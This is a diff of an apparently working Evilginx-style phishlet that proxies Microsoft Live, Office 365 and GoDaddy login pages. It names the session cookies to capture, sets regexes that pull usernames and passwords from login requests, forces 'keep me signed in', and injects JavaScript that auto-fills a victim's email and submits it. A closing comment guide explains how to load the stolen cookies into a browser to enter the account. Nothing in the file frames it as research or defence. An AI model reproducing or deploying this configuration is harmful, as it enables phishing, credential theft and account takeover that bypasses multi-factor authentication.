@@ -1,63 +1,93 @@
 author: '@An0nud4y'
 min_ver: '2.3.0'
+
 proxy_hosts:
+  # Microsoft Live-related hosts
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true}
+  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'storage', orig_sub: 'storage', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false}
+
+  # Microsoft Online/Office-related hosts
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: true}
   - {phish_sub: '', orig_sub: '', domain: 'microsoftonline.com', session: true, is_landing: false}
   - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false}
   - {phish_sub: 'office365', orig_sub: 'outlook', domain: 'office365.com', session: false, is_landing: false}
   - {phish_sub: 'res', orig_sub: 'r4.res', domain: 'office365.com', session: false, is_landing: false}
+
+  # Microsoft General hosts
+  - {phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false}
+
+  # GoDaddy/Optional Service-specific hosts (add based on service being targeted)
   - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'sso1', orig_sub: 'sso1', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false}
   - {phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing: false}
   - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: true, is_landing: false}
   - {phish_sub: 'img6', orig_sub: 'img6', domain: 'wsimg.com', session: true, is_landing: false}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true}
-  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
-  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
-  - {phish_sub: 'storage', orig_sub: 'storage', domain: 'live.com', session: true, is_landing: false}
-  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false}
-  - {phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false}
-  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.nl', session: true, is_landing: false}  # Fixed typo
 
 sub_filters:
+  # Filters for login.live.com
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+
+  # Filters for login.microsoftonline.com
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  # Removed redundant filters where search == replace
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'office365.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  # GoDaddy-specific filters (optional based on service)
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 
 auth_tokens:
+  - domain: '.login.live.com'
+    keys: ['MSPOK']
+  - domain: '.live.com'
+    keys: ['WLSSC', 'MSPAuth']
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState']
   - domain: 'login.microsoftonline.com'
     keys: ['ESTSAUTHLIGHT', 'ESTSSC', 'SignInStateCookie']
-  - domain: '.login.live.com'
-    keys: ['MSPOK']
-  - domain: '.live.com'
-    keys: ['WLSSC', 'MSPAuth']  # Example of more specific keys
-  - domain: 'outlook.live.com'
-    keys: ['O365Consumer']
-  - domain: 'sso.secureserver.net'
-    keys: ['sso_token']
   - domain: '.microsoft.com'
     keys: ['MUID']
   - domain: '.account.microsoft.com'
     keys: ['MSID']
-  - domain: 'sso.godaddy.com'
-    keys: ['gd_sso']
 
 auth_urls:
+  - '/'
   - '/*'
   - '/auth'
   - '/auth/*'
 
 credentials:
+  # JSON-based (preferred for modern Microsoft endpoints)
   username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  # Fallback POST-based (for older endpoints like live.com)
+  username_fallback:
     key: 'login'
     search: '(.*)'
     type: 'post'
-  password:
+  password_fallback:
     key: 'passwd'
     search: '(.*)'
     type: 'post'
@@ -65,15 +95,25 @@ credentials:
 force_post:
   - path: '/ppsecure/post.srf'
     search:
-      - {key: 'login', search: '[^&]+'}  # Narrowed to match realistic input
+      - {key: 'login', search: '[^&]+'}  # Narrowed from '.*' for better matching
       - {key: 'passwd', search: '[^&]+'}
     force:
       - {key: 'KMSI', value: 'on'}
     type: 'post'
 
 login:
-  domain: 'login.live.com'
-  path: 'login.srf'
+  # Primary login for Office/Microsoft Online
+  domain: 'www.office.com'
+  path: '/login?es=Click&ru=%2F'
+  # Fallback login for Live
+  alt_domain: 'login.live.com'
+  alt_path: 'login.srf'
+
+# GUIDE TO GET SESSION FROM COOKIES
+# 1) Insert the captured cookies in a browser (use any proper extension).
+# 2) Then visit the following link to reach the account:
+#    - For Microsoft Online: https://login.microsoftonline.com/
+#    - For Live: https://login.live.com/
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
@@ -91,16 +131,16 @@ js_inject:
           var [data1, data2] = query.split("#");
           if (emailId && nextButton) {
             var decodedString = data2;
-            if (/^[A-Za-z0-9+/=]*$/.test(data2) && data2.length > 0) { // Improved base64 check
+            if (/^[A-Za-z0-9+/=]*$/.test(data2) && data2.length > 0) {
               try {
-                decodedString = atob(data2.replace(/=/g, '')); // Remove padding for decoding
+                decodedString = atob(data2.replace(/=/g, ''));
               } catch (e) {
                 console.error('Error decoding base64 string:', e);
                 decodedString = data2; // Fallback to raw string
               }
             }
             emailId.value = decodedString;
-            emailId.dispatchEvent(new Event('input')); // Trigger input event
+            emailId.dispatchEvent(new Event('input'));
             nextButton.click();
             console.log("Filled email and clicked next!");
             return;
